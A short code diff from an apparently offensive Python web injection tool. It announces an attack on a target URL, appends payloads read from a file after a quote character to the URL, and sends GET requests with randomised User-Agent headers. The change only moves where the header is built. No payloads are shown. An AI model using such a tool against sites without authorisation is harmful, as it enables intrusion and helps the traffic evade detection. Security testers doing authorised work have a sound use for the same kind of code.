@@ -17,6 +17,7 @@ class Main:
             print(f"{Fore.YELLOW}[!] Starting attack on {args.url}")
             file = open("list1.txt", "r", encoding="utf-8")
             onstring = file.read().split("\n")[:-1]
+            header = {"User-Agent": "{}".format(random.choice(open("User-agent.txt","r").read().splitlines()))}
             parsed_url = urlparse(args.url)
             formatted_dict = ', '.join(f'{key}: {value}' for key, value in header.items())
             for param_name in parsed_url.query.split("&"):
@@ -33,7 +34,6 @@ class Main:
                     
             parse()
             for payload in onstring:
-                header = {"User-Agent": "{}".format(random.choice(open("User-agent.txt","r").read().splitlines()))}
                 respurl = args.url+'"'+payload
                 resp = requests.get(respurl, timeout=30, headers=header)
 
